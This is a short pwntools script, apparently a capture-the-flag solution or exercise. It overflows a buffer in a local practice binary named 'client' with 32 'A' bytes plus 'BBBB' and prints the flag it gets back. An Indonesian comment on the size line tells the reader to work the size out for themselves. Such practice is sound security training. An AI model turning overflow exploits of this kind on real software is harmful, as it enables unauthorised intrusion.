from pwn import *

elf = ELF("./client")

io = elf.process()

size = 32# silahkan cari tahu sendiri

io.sendlineafter(b'> ', b'A' * size + b'BBBB')

io.recvuntil(b'flag: ')

flag = io.recvline().strip()

print(f'flag: {flag}')

io.close()
